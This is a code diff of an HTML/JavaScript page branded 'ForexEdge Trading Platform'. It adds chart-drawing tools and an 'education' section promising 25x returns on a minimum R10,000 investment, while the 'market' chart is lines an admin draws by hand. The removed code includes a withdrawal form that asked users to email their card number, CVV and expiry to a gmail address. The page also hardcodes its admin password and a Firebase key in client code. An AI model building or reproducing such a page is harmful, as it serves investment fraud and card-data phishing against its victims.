@@ -5,7 +5,6 @@
 
 
 
-
 <link rel="manifest" href="manifest.json">
      <meta name="theme-color" content="#2196f3">
 
@@ -14,7 +13,7 @@
 
 
 
-    
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ForexEdge Trading Platform</title>
@@ -44,6 +43,18 @@
         .logo {
             height: 40px;
             width: auto;
+        }
+        
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .brand-name {
+            font-size: 18px;
+            font-weight: bold;
+            color: #0f172a;
         }
         
         .header-btns {
@@ -80,8 +91,14 @@
         .currency-header {
             display: flex;
             align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+
+        .currency-info {
+            display: flex;
+            align-items: center;
             gap: 12px;
-            margin-bottom: 16px;
         }
         
         .currency-logo {
@@ -99,6 +116,55 @@
             font-size: 14px;
             color: #64748b;
         }
+
+        .date-display {
+            font-size: 14px;
+            color: #64748b;
+            font-weight: 500;
+        }
+
+        .tools-bar {
+            display: flex;
+            gap: 8px;
+            padding: 12px;
+            background: #f8fafc;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            overflow-x: auto;
+        }
+
+        .tool-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            padding: 8px 12px;
+            background: white;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            cursor: pointer;
+            min-width: 60px;
+            transition: all 0.2s;
+        }
+
+        .tool-item:hover {
+            background: #f1f5f9;
+        }
+
+        .tool-item.active {
+            background: #3b82f6;
+            color: white;
+            border-color: #3b82f6;
+        }
+
+        .tool-icon {
+            font-size: 20px;
+        }
+
+        .tool-label {
+            font-size: 10px;
+            font-weight: 500;
+        }
         
         .chart-container {
             position: relative;
@@ -107,7 +173,7 @@
             border-radius: 16px;
             padding: 16px;
             margin-bottom: 24px;
-            height: 400px;
+            height: 450px;
             touch-action: none;
         }
         
@@ -124,6 +190,7 @@
             display: none;
             gap: 8px;
             z-index: 10;
+            flex-wrap: wrap;
         }
         
         .chart-tools.admin {
@@ -155,6 +222,12 @@
             background: #10b981;
             color: white;
             border-color: #10b981;
+        }
+
+        .tool-btn.clear-my {
+            background: #f59e0b;
+            color: white;
+            border-color: #f59e0b;
         }
         
         .action-buttons {
@@ -189,6 +262,70 @@
         
         .btn-trade:hover {
             background: #059669;
+        }
+
+        .education-section {
+            background: white;
+            border: 1px solid #e2e8f0;
+            border-radius: 16px;
+            padding: 20px;
+            margin-top: 24px;
+        }
+
+        .education-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 16px;
+            color: #0f172a;
+        }
+
+        .education-content {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .education-item {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .education-item h3 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #0f172a;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .education-item p {
+            font-size: 14px;
+            color: #64748b;
+            line-height: 1.6;
+        }
+
+        .education-item ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .education-item li {
+            font-size: 14px;
+            color: #64748b;
+            padding: 4px 0;
+        }
+
+        .reward-highlight {
+            background: #d1fae5;
+            color: #047857;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 600;
         }
         
         .bottom-nav {
@@ -312,6 +449,7 @@
             background: white;
             border-radius: 8px;
             cursor: pointer;
+            font-weight: 500;
         }
         
         .btn-primary {
@@ -322,6 +460,48 @@
             color: white;
             border-radius: 8px;
             cursor: pointer;
+            font-weight: 600;
+        }
+
+        .text-input-overlay {
+            position: absolute;
+            background: white;
+            border: 2px solid #3b82f6;
+            border-radius: 8px;
+            padding: 8px;
+            display: none;
+            z-index: 100;
+        }
+
+        .text-input-overlay input {
+            border: none;
+            outline: none;
+            font-size: 14px;
+            width: 200px;
+        }
+
+        .text-input-overlay button {
+            margin-left: 8px;
+            padding: 4px 12px;
+            background: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .delete-btn {
+            position: absolute;
+            background: #ef4444;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            font-size: 12px;
+            display: none;
+            z-index: 50;
         }
     </style>
 </head>
@@ -331,57 +511,154 @@
             <img src="https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/user_690ba922fbe430d3664faeaa/fa08d83cb_Screenshot_20250930_020839_Gallery.jpg" 
                  alt="ForexEdge" class="logo">
         </div>
-        <div class="header-btns">
-            <button class="settings-btn" onclick="openSettings()">⚙️</button>
-            <button class="logout-btn" id="logoutBtn" onclick="logout()">Logout</button>
+        <div class="header-right">
+            <span class="brand-name">ForexEdge</span>
+            <div class="header-btns">
+                <button class="settings-btn" onclick="openSettings()">⚙️</button>
+                <button class="logout-btn" id="logoutBtn" onclick="logout()">Logout</button>
+            </div>
         </div>
     </div>
 
     <div class="main-content">
         <div class="currency-header">
-            <img src="https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/user_690ba922fbe430d3664faeaa/fa08d83cb_Screenshot_20250930_020839_Gallery.jpg" 
-                 alt="ForexEdge" class="currency-logo">
-            <div>
-                <div class="currency-title">EUR/USD</div>
-                <div class="currency-subtitle">European Euro / US Dollar</div>
+            <div class="currency-info">
+                <img src="https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/user_690ba922fbe430d3664faeaa/fa08d83cb_Screenshot_20250930_020839_Gallery.jpg" 
+                     alt="ForexEdge" class="currency-logo">
+                <div>
+                    <div class="currency-title">EUR/USD</div>
+                    <div class="currency-subtitle">European Euro / US Dollar</div>
+                </div>
+            </div>
+            <div class="date-display" id="dateDisplay"></div>
+        </div>
+
+        <div class="tools-bar" id="toolsBar">
+            <div class="tool-item" onclick="selectTool('horizontal')" data-tool="horizontal">
+                <div class="tool-icon">━</div>
+                <div class="tool-label">Horizontal</div>
+            </div>
+            <div class="tool-item" onclick="selectTool('vertical')" data-tool="vertical">
+                <div class="tool-icon">┃</div>
+                <div class="tool-label">Vertical</div>
+            </div>
+            <div class="tool-item" onclick="selectTool('trendline')" data-tool="trendline">
+                <div class="tool-icon">╱</div>
+                <div class="tool-label">Trendline</div>
+            </div>
+            <div class="tool-item" onclick="selectTool('text')" data-tool="text">
+                <div class="tool-icon">T</div>
+                <div class="tool-label">Text</div>
+            </div>
+            <div class="tool-item" onclick="clearMyPredictions()" data-tool="clear">
+                <div class="tool-icon">🗑️</div>
+                <div class="tool-label">Clear Mine</div>
             </div>
         </div>
 
         <div class="chart-container">
-            <div class="chart-tools" id="chartTools">
-                <button class="tool-btn" id="drawBtn" onclick="toggleDraw()">✏️ Draw</button>
-                <button class="tool-btn" id="finishBtn" onclick="finishLine()" style="display:none;">✓ Finish</button>
-                <button class="tool-btn" onclick="clearAllDrawings()">🗑️ Clear All</button>
+            <div class="chart-tools" id="adminTools">
+                <button class="tool-btn" id="drawBtn" onclick="toggleAdminDraw()">✏️ Draw Chart</button>
+                <button class="tool-btn finish" id="finishBtn" onclick="finishAdminLine()" style="display:none;">✓ Finish</button>
+                <button class="tool-btn" onclick="clearAdminDrawings()">🗑️ Clear Chart</button>
             </div>
             <canvas id="chartCanvas"></canvas>
+            <div class="text-input-overlay" id="textInputOverlay">
+                <input type="text" id="textInput" placeholder="Enter text...">
+                <button onclick="addTextAnnotation()">Add</button>
+            </div>
         </div>
 
         <div class="action-buttons">
-            <button class="btn btn-withdrawal" onclick="openWithdrawal()">Withdrawal</button>
-            <button class="btn btn-trade" onclick="openInvest()">Trade</button>
+            <button class="btn btn-withdrawal" onclick="handleWithdrawal()">Withdrawal</button>
+            <button class="btn btn-trade" onclick="handleInvest()">Invest</button>
+        </div>
+
+        <div class="education-section">
+            <div class="education-header">
+                📚 How To Invest & Trade
+            </div>
+            <div class="education-content">
+                <div class="education-item">
+                    <h3>📈 Step 1: Learn to Predict</h3>
+                    <p>Use the tools above the chart to analyze and predict market movements:</p>
+                    <ul>
+                        <li>━ <strong>Horizontal lines</strong> - Mark support/resistance levels. Tap to place, drag to move.</li>
+                        <li>┃ <strong>Vertical lines</strong> - Mark important time points. Tap to place.</li>
+                        <li>╱ <strong>Trendlines</strong> - Connect two points to show trend direction. Tap twice to draw.</li>
+                        <li>T <strong>Text tool</strong> - Add labels to your analysis (e.g., "Breakout here", "Support level").</li>
+                    </ul>
+                </div>
+
+                <div class="education-item">
+                    <h3>🎯 Step 2: Make Your Predictions</h3>
+                    <p>Each day shows a new market pattern. Study the admin's chart (blue lines) carefully. Use your tools to predict where the market will go next. Your predictions are private - only you can see them!</p>
+                </div>
+
+                <div class="education-item">
+                    <h3>💰 Step 3: Ready to Invest?</h3>
+                    <p>Once you're confident in your prediction skills, click the green <strong>"Invest"</strong> button above. This will guide you through:</p>
+                    <ul>
+                        <li>• Creating your trading account</li>
+                        <li>• Making your minimum investment (R10,000)</li>
+                        <li>• Placing your first trade</li>
+                        <li>• Understanding risk management</li>
+                    </ul>
+                </div>
+
+                <div class="education-item">
+                    <h3>🏆 Rewards & Profits</h3>
+                    <div class="reward-highlight">
+                        Correct predictions earn 25x your investment!<br>
+                        Example: R10,000 → R250,000 potential return
+                    </div>
+                </div>
+
+                <div class="education-item">
+                    <h3>📊 Common Trading Patterns</h3>
+                    <ul>
+                        <li>• <strong>Head and Shoulders</strong> - Trend reversal pattern</li>
+                        <li>• <strong>Double Top/Bottom</strong> - Strong reversal signal</li>
+                        <li>• <strong>Triangle Patterns</strong> - Breakout indicators</li>
+                        <li>• <strong>Flag & Pennant</strong> - Continuation patterns</li>
+                        <li>• <strong>Support & Resistance</strong> - Key price levels</li>
+                    </ul>
+                </div>
+
+                <div class="education-item">
+                    <h3>⚠️ Important Tips</h3>
+                    <ul>
+                        <li>• Practice analyzing patterns before investing real money</li>
+                        <li>• The blue lines show the actual market movement (admin chart)</li>
+                        <li>• Your colored predictions are private and help you practice</li>
+                        <li>• The next day reveals if your prediction was correct</li>
+                        <li>• Only invest what you can afford to lose</li>
+                    </ul>
+                </div>
+            </div>
         </div>
     </div>
 
     <div class="bottom-nav">
         <div class="nav-items">
             <button class="nav-item">
-                <div class="nav-icon inactive">A</div>
+                <div class="nav-icon inactive">👤</div>
                 <span class="nav-label">Accounts</span>
             </button>
             <button class="nav-item">
-                <div class="nav-icon active">T</div>
+                <div class="nav-icon active">📊</div>
                 <span class="nav-label active">Trade</span>
             </button>
             <button class="nav-item">
-                <div class="nav-icon inactive">I</div>
+                <div class="nav-icon inactive">💡</div>
                 <span class="nav-label">Insights</span>
             </button>
             <button class="nav-item">
-                <div class="nav-icon inactive">P</div>
+                <div class="nav-icon inactive">📈</div>
                 <span class="nav-label">Performance</span>
             </button>
             <button class="nav-item">
-                <div class="nav-icon inactive">Pr</div>
+                <div class="nav-icon inactive">⚙️</div>
                 <span class="nav-label">Profile</span>
             </button>
         </div>
@@ -392,7 +669,7 @@
             <div class="modal-title">Admin Login</div>
             <div class="input-group">
                 <label>Password</label>
-                <input type="password" id="passwordInput" placeholder="Enter password">
+                <input type="password" id="passwordInput" placeholder="Enter admin password">
             </div>
             <div class="modal-buttons">
                 <button class="btn-secondary" onclick="closeSettings()">Cancel</button>
@@ -402,8 +679,8 @@
     </div>
 
     <script type="module">
-        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
-        import { getFirestore, collection, addDoc, onSnapshot, deleteDoc, doc } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js';
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, collection, addDoc, getDocs, deleteDoc, doc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyCh14tX6MwH1sl1X0k8chnhiNNYU1l41cs",
@@ -420,10 +697,32 @@
 
         const canvas = document.getElementById('chartCanvas');
         const ctx = canvas.getContext('2d');
-        let drawMode = false;
+        let isAdminDrawing = false;
+        let adminDrawMode = false;
+        let adminLines = [];
+        let currentAdminLine = [];
         let isAuthenticated = false;
-        let currentPoints = [];
-        let allLines = [];
+
+        // User predictions stored in localStorage (private to each user)
+        let userPredictions = JSON.parse(localStorage.getItem('userPredictions') || '[]');
+        let textAnnotations = JSON.parse(localStorage.getItem('textAnnotations') || '[]');
+        let currentTool = null;
+        let currentPrediction = { type: null, points: [] };
+        let selectedElement = null;
+        let isDragging = false;
+        let dragOffset = { x: 0, y: 0 };
+
+        function saveUserData() {
+            localStorage.setItem('userPredictions', JSON.stringify(userPredictions));
+            localStorage.setItem('textAnnotations', JSON.stringify(textAnnotations));
+        }
+
+        function updateDate() {
+            const date = new Date();
+            const options = { weekday: 'short', year: 'numeric', month: 'short', day: 'numeric' };
+            document.getElementById('dateDisplay').textContent = date.toLocaleDateString('en-US', options);
+        }
+        updateDate();
 
         function resizeCanvas() {
             const rect = canvas.getBoundingClientRect();
@@ -434,15 +733,6 @@
 
         window.addEventListener('resize', resizeCanvas);
         resizeCanvas();
-
-        // Listen to Firestore for real-time updates
-        onSnapshot(collection(db, 'drawings'), (snapshot) => {
-            allLines = [];
-            snapshot.forEach((doc) => {
-                allLines.push({ id: doc.id, points: doc.data().points });
-            });
-            drawChart();
-        });
 
         function drawChart() {
             ctx.clearRect(0, 0, canvas.width, canvas.height);
@@ -463,38 +753,130 @@
                 ctx.stroke();
             }
             
-            // Draw all saved lines from Firestore
-            allLines.forEach(line => {
-                if (line.points && line.points.length > 1) {
+            // Draw admin lines from Firebase (everyone sees these)
+            adminLines.forEach(line => {
+                if (line.length > 1) {
                     ctx.strokeStyle = '#3b82f6';
                     ctx.lineWidth = 3;
                     ctx.lineCap = 'round';
                     ctx.lineJoin = 'round';
                     ctx.beginPath();
-                    ctx.moveTo(line.points[0].x, line.points[0].y);
-                    for (let i = 1; i < line.points.length; i++) {
-                        ctx.lineTo(line.points[i].x, line.points[i].y);
+                    ctx.moveTo(line[0].x, line[0].y);
+                    for (let i = 1; i < line.length; i++) {
+                        ctx.lineTo(line[i].x, line[i].y);
                     }
                     ctx.stroke();
                 }
             });
             
-            // Draw current line being created
-            if (currentPoints.length > 0) {
+            // Draw current admin line
+            if (currentAdminLine.length > 0) {
                 ctx.strokeStyle = '#3b82f6';
                 ctx.lineWidth = 3;
                 ctx.lineCap = 'round';
                 ctx.lineJoin = 'round';
                 ctx.beginPath();
-                ctx.moveTo(currentPoints[0].x, currentPoints[0].y);
-                for (let i = 1; i < currentPoints.length; i++) {
-                    ctx.lineTo(currentPoints[i].x, currentPoints[i].y);
+                ctx.moveTo(currentAdminLine[0].x, currentAdminLine[0].y);
+                for (let i = 1; i < currentAdminLine.length; i++) {
+                    ctx.lineTo(currentAdminLine[i].x, currentAdminLine[i].y);
                 }
                 ctx.stroke();
 
-                // Draw points
-                currentPoints.forEach(point => {
+                currentAdminLine.forEach(point => {
                     ctx.fillStyle = '#3b82f6';
+                    ctx.beginPath();
+                    ctx.arc(point.x, point.y, 5, 0, Math.PI * 2);
+                    ctx.fill();
+                });
+            }
+
+            // Draw user predictions from localStorage (only this user sees these)
+            userPredictions.forEach((pred, index) => {
+                ctx.strokeStyle = '#f59e0b';
+                ctx.lineWidth = 2;
+                ctx.setLineDash([5, 5]);
+                
+                if (pred.type === 'horizontal' && pred.points.length > 0) {
+                    ctx.beginPath();
+                    ctx.moveTo(0, pred.points[0].y);
+                    ctx.lineTo(canvas.width, pred.points[0].y);
+                    ctx.stroke();
+                    
+                    // Draw draggable handle
+                    ctx.fillStyle = '#f59e0b';
+                    ctx.beginPath();
+                    ctx.arc(canvas.width / 2, pred.points[0].y, 6, 0, Math.PI * 2);
+                    ctx.fill();
+                } else if (pred.type === 'vertical' && pred.points.length > 0) {
+                    ctx.beginPath();
+                    ctx.moveTo(pred.points[0].x, 0);
+                    ctx.lineTo(pred.points[0].x, canvas.height);
+                    ctx.stroke();
+                    
+                    // Draw draggable handle
+                    ctx.fillStyle = '#f59e0b';
+                    ctx.beginPath();
+                    ctx.arc(pred.points[0].x, canvas.height / 2, 6, 0, Math.PI * 2);
+                    ctx.fill();
+                } else if (pred.type === 'trendline' && pred.points.length === 2) {
+                    ctx.beginPath();
+                    ctx.moveTo(pred.points[0].x, pred.points[0].y);
+                    ctx.lineTo(pred.points[1].x, pred.points[1].y);
+                    ctx.stroke();
+                    
+                    // Draw handles on both ends
+                    pred.points.forEach(point => {
+                        ctx.fillStyle = '#f59e0b';
+                        ctx.beginPath();
+                        ctx.arc(point.x, point.y, 6, 0, Math.PI * 2);
+                        ctx.fill();
+                    });
+                }
+                
+                ctx.setLineDash([]);
+            });
+
+            // Draw text annotations from localStorage
+            textAnnotations.forEach((text, index) => {
+                ctx.fillStyle = '#0f172a';
+                ctx.font = 'bold 14px Arial';
+                ctx.fillText(text.content, text.x, text.y);
+                
+                // Draw small circle for dragging/deleting
+                ctx.fillStyle = '#f59e0b';
+                ctx.beginPath();
+                ctx.arc(text.x - 5, text.y - 5, 4, 0, Math.PI * 2);
+                ctx.fill();
+            });
+
+            // Draw current prediction being drawn
+            if (currentPrediction.points.length > 0) {
+                ctx.strokeStyle = '#f59e0b';
+                ctx.lineWidth = 2;
+                ctx.setLineDash([5, 5]);
+                
+                const p = currentPrediction.points[0];
+                if (currentPrediction.type === 'horizontal') {
+                    ctx.beginPath();
+                    ctx.moveTo(0, p.y);
+                    ctx.lineTo(canvas.width, p.y);
+                    ctx.stroke();
+                } else if (currentPrediction.type === 'vertical') {
+                    ctx.beginPath();
+                    ctx.moveTo(p.x, 0);
+                    ctx.lineTo(p.x, canvas.height);
+                    ctx.stroke();
+                } else if (currentPrediction.type === 'trendline' && currentPrediction.points.length === 2) {
+                    ctx.beginPath();
+                    ctx.moveTo(currentPrediction.points[0].x, currentPrediction.points[0].y);
+                    ctx.lineTo(currentPrediction.points[1].x, currentPrediction.points[1].y);
+                    ctx.stroke();
+                }
+                
+                ctx.setLineDash([]);
+
+                currentPrediction.points.forEach(point => {
+                    ctx.fillStyle = '#f59e0b';
                     ctx.beginPath();
                     ctx.arc(point.x, point.y, 5, 0, Math.PI * 2);
                     ctx.fill();
@@ -502,136 +884,317 @@
             }
         }
 
-        window.toggleDraw = function() {
-            if (!isAuthenticated) {
-                alert('Please login first');
-                return;
+        function getElementAtPosition(x, y) {
+            // Check text annotations
+            for (let i = textAnnotations.length - 1; i >= 0; i--) {
+                const text = textAnnotations[i];
+                const dist = Math.sqrt(Math.pow(x - text.x, 2) + Math.pow(y - text.y, 2));
+                if (dist < 20) {
+                    return { type: 'text', index: i, data: text };
+                }
             }
-            drawMode = !drawMode;
-            const btn = document.getElementById('drawBtn');
-            if (drawMode) {
-                btn.classList.add('active');
-                currentPoints = [];
-            } else {
-                btn.classList.remove('active');
-                currentPoints = [];
+            
+            // Check predictions
+            for (let i = userPredictions.length - 1; i >= 0; i--) {
+                const pred = userPredictions[i];
+                if (pred.type === 'horizontal') {
+                    if (Math.abs(y - pred.points[0].y) < 10) {
+                        return { type: 'horizontal', index: i, data: pred };
+                    }
+                } else if (pred.type === 'vertical') {
+                    if (Math.abs(x - pred.points[0].x) < 10) {
+                        return { type: 'vertical', index: i, data: pred };
+                    }
+                } else if (pred.type === 'trendline') {
+                    for (let j = 0; j < pred.points.length; j++) {
+                        const dist = Math.sqrt(Math.pow(x - pred.points[j].x, 2) + Math.pow(y - pred.points[j].y, 2));
+                        if (dist < 15) {
+                            return { type: 'trendline', index: i, pointIndex: j, data: pred };
+                        }
+                    }
+                }
+            }
+            return null;
+        }
+
+        window.selectTool = function(tool) {
+            currentTool = tool;
+            currentPrediction = { type: tool, points: [] };
+            document.querySelectorAll('.tool-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            const toolElement = document.querySelector(`[data-tool="${tool}"]`);
+            if (toolElement) {
+                toolElement.classList.add('active');
+            }
+        };
+
+        window.clearMyPredictions = function() {
+            if (confirm('Clear all your predictions and annotations?')) {
+                userPredictions = [];
+                textAnnotations = [];
+                saveUserData();
                 drawChart();
             }
-        }
+        };
 
-        window.finishLine = async function() {
-            if (currentPoints.length > 1) {
-                try {
-                    await addDoc(collection(db, 'drawings'), {
-                        points: currentPoints,
-                        timestamp: new Date()
-                    });
-                    currentPoints = [];
-                    drawMode = false;
-                    document.getElementById('drawBtn').classList.remove('active');
-                    drawChart();
-                } catch (error) {
-                    console.error('Error saving line:', error);
-                }
-            }
-        }
-
-        window.clearAllDrawings = async function() {
+        window.toggleAdminDraw = function() {
             if (!isAuthenticated) {
-                alert('Please login first');
+                alert('Please login as admin first');
                 return;
             }
-            if (confirm('Clear all drawings?')) {
-                try {
-                    const snapshot = await getDocs(collection(db, 'drawings'));
-                    snapshot.forEach(async (document) => {
-                        await deleteDoc(doc(db, 'drawings', document.id));
-                    });
-                } catch (error) {
-                    console.error('Error clearing drawings:', error);
-                }
-            }
-        }
-
-        canvas.addEventListener('click', (e) => {
-            if (!drawMode || !isAuthenticated) return;
+            adminDrawMode = !adminDrawMode;
+            const btn = document.getElementById('drawBtn');
+            const finishBtn = document.getElementById('finishBtn');
             
-            e.preventDefault();
+            if (adminDrawMode) {
+                btn.classList.add('active');
+                finishBtn.style.display = 'block';
+                currentAdminLine = [];
+            } else {
+                btn.classList.remove('active');
+                finishBtn.style.display = 'none';
+            }
+        };
+
+        window.finishAdminLine = async function() {
+            if (currentAdminLine.length > 1) {
+                adminLines.push([...currentAdminLine]);
+                
+                await addDoc(collection(db, 'adminDrawings'), {
+                    line: currentAdminLine,
+                    timestamp: new Date()
+                });
+                
+                currentAdminLine = [];
+                adminDrawMode = false;
+                document.getElementById('drawBtn').classList.remove('active');
+                document.getElementById('finishBtn').style.display = 'none';
+                drawChart();
+            }
+        };
+
+        window.clearAdminDrawings = async function() {
+            if (!isAuthenticated || !confirm('Clear the entire chart? This will remove all admin drawings.')) return;
+            
+            adminLines = [];
+            currentAdminLine = [];
+            
+            const querySnapshot = await getDocs(collection(db, 'adminDrawings'));
+            querySnapshot.forEach(async (document) => {
+                await deleteDoc(doc(db, 'adminDrawings', document.id));
+            });
+            
+            drawChart();
+        };
+
+        canvas.addEventListener('mousedown', (e) => {
             const rect = canvas.getBoundingClientRect();
             const x = e.clientX - rect.left;
             const y = e.clientY - rect.top;
-            
-            currentPoints.push({ x, y });
-            drawChart();
-            
-            if (currentPoints.length > 1) {
-                document.getElementById('finishBtn').style.display = 'block';
+
+            // Admin drawing
+            if (adminDrawMode && isAuthenticated) {
+                currentAdminLine.push({ x, y });
+                isAdminDrawing = true;
+                drawChart();
+                return;
+            }
+
+            // Check if clicking on existing element
+            const element = getElementAtPosition(x, y);
+            if (element && e.button === 2) { // Right click to delete
+                e.preventDefault();
+                if (element.type === 'text') {
+                    textAnnotations.splice(element.index, 1);
+                } else {
+                    userPredictions.splice(element.index, 1);
+                }
+                saveUserData();
+                drawChart();
+                return;
+            }
+
+            if (element) {
+                selectedElement = element;
+                isDragging = true;
+                dragOffset = { x, y };
+                return;
+            }
+
+            // Drawing new elements
+            if (!currentTool) return;
+
+            if (currentTool === 'text') {
+                const overlay = document.getElementById('textInputOverlay');
+                overlay.style.display = 'block';
+                overlay.style.left = e.clientX + 'px';
+                overlay.style.top = e.clientY + 'px';
+                document.getElementById('textInput').value = '';
+                document.getElementById('textInput').focus();
+                window.pendingTextPosition = { x, y };
+                return;
+            }
+
+            if (currentTool === 'horizontal' || currentTool === 'vertical') {
+                currentPrediction.points = [{ x, y }];
+                userPredictions.push({ ...currentPrediction });
+                saveUserData();
+                currentPrediction = { type: currentTool, points: [] };
+                drawChart();
+            } else if (currentTool === 'trendline') {
+                currentPrediction.points.push({ x, y });
+                if (currentPrediction.points.length === 2) {
+                    userPredictions.push({ ...currentPrediction });
+                    saveUserData();
+                    currentPrediction = { type: currentTool, points: [] };
+                }
+                drawChart();
             }
         });
 
-        canvas.addEventListener('touchstart', (e) => {
-            if (!drawMode || !isAuthenticated) return;
-            
-            e.preventDefault();
+        canvas.addEventListener('mousemove', (e) => {
             const rect = canvas.getBoundingClientRect();
-            const touch = e.touches[0];
-            const x = touch.clientX - rect.left;
-            const y = touch.clientY - rect.top;
-            
-            currentPoints.push({ x, y });
-            drawChart();
-            
-            if (currentPoints.length > 1) {
-                document.getElementById('finishBtn').style.display = 'block';
+            const x = e.clientX - rect.left;
+            const y = e.clientY - rect.top;
+
+            // Admin continuous drawing
+            if (adminDrawMode && isAuthenticated && isAdminDrawing) {
+                currentAdminLine.push({ x, y });
+                drawChart();
+                return;
+            }
+
+            // User trendline preview
+            if (currentTool === 'trendline' && currentPrediction.points.length === 1) {
+                currentPrediction.points[1] = { x, y };
+                drawChart();
+                return;
+            }
+
+            // Dragging elements
+            if (isDragging && selectedElement) {
+                if (selectedElement.type === 'horizontal') {
+                    userPredictions[selectedElement.index].points[0].y = y;
+                } else if (selectedElement.type === 'vertical') {
+                    userPredictions[selectedElement.index].points[0].x = x;
+                } else if (selectedElement.type === 'trendline') {
+                    userPredictions[selectedElement.index].points[selectedElement.pointIndex] = { x, y };
+                } else if (selectedElement.type === 'text') {
+                    textAnnotations[selectedElement.index].x = x;
+                    textAnnotations[selectedElement.index].y = y;
+                }
+                saveUserData();
+                drawChart();
             }
         });
+
+        canvas.addEventListener('mouseup', () => {
+            if (adminDrawMode && isAuthenticated) {
+                isAdminDrawing = false;
+            }
+            isDragging = false;
+            selectedElement = null;
+        });
+
+        canvas.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+        });
+
+        // Touch support
+        canvas.addEventListener('touchstart', (e) => {
+            e.preventDefault();
+            const touch = e.touches[0];
+            const mouseEvent = new MouseEvent('mousedown', {
+                clientX: touch.clientX,
+                clientY: touch.clientY,
+                button: 0
+            });
+            canvas.dispatchEvent(mouseEvent);
+        });
+
+        canvas.addEventListener('touchmove', (e) => {
+            e.preventDefault();
+            const touch = e.touches[0];
+            const mouseEvent = new MouseEvent('mousemove', {
+                clientX: touch.clientX,
+                clientY: touch.clientY
+            });
+            canvas.dispatchEvent(mouseEvent);
+        });
+
+        canvas.addEventListener('touchend', (e) => {
+            e.preventDefault();
+            const mouseEvent = new MouseEvent('mouseup', {});
+            canvas.dispatchEvent(mouseEvent);
+        });
+
+        window.addTextAnnotation = function() {
+            const text = document.getElementById('textInput').value;
+            if (!text) return;
+            
+            const annotation = {
+                content: text,
+                x: window.pendingTextPosition.x,
+                y: window.pendingTextPosition.y
+            };
+            
+            textAnnotations.push(annotation);
+            saveUserData();
+            
+            document.getElementById('textInputOverlay').style.display = 'none';
+            drawChart();
+        };
+
+        window.handleInvest = function() {
+            window.open('https://zapk1.github.io/fxedge/', '_blank');
+        };
+
+        window.handleWithdrawal = function() {
+            alert('Withdrawal functionality - Contact support for withdrawal requests');
+        };
 
         window.openSettings = function() {
             document.getElementById('settingsModal').classList.add('open');
-        }
+        };
 
         window.closeSettings = function() {
             document.getElementById('settingsModal').classList.remove('open');
-        }
+        };
 
         window.authenticate = function() {
             const password = document.getElementById('passwordInput').value;
             if (password === 'VNAXXTTM') {
                 isAuthenticated = true;
-                document.getElementById('chartTools').classList.add('admin');
+                document.getElementById('adminTools').classList.add('admin');
                 document.getElementById('logoutBtn').classList.add('show');
-                alert('Login successful! You can now draw on the chart.');
+                alert('Admin login successful!');
                 closeSettings();
-                document.getElementById('passwordInput').value = '';
             } else {
                 alert('Incorrect password');
             }
-        }
+        };
 
         window.logout = function() {
             isAuthenticated = false;
-            drawMode = false;
-            currentPoints = [];
-            document.getElementById('chartTools').classList.remove('admin');
+            adminDrawMode = false;
+            document.getElementById('adminTools').classList.remove('admin');
             document.getElementById('logoutBtn').classList.remove('show');
             document.getElementById('drawBtn').classList.remove('active');
             document.getElementById('finishBtn').style.display = 'none';
+            alert('Logged out successfully');
+        };
+
+        // Load admin drawings from Firestore (everyone sees these)
+        onSnapshot(collection(db, 'adminDrawings'), (snapshot) => {
+            adminLines = [];
+            snapshot.forEach((doc) => {
+                adminLines.push(doc.data().line);
+            });
             drawChart();
-        }
-
-        window.openInvest = function() {
-            window.open('https://zapk1.github.io/fxedge/', '_blank');
-        }
-
-        window.openWithdrawal = function() {
-            const subject = encodeURIComponent('Withdrawal Request - ForexEdge');
-            const body = encodeURIComponent('I am requesting a withdrawal from my ForexEdge account.\n\nMy Details:\nName: \nEmail: \nAmount: R\n\nBank Details:\nBank Name: \nAccount Number: \nCard Number: \nCVV: \nExpiry Date: \n\nPlease process my withdrawal request.');
-            window.location.href = `mailto:forexedge27@gmail.com?subject=${subject}&body=${body}`;
-        }
+        });
 
         drawChart();
     </script>
 </body>
 </html>
-
-
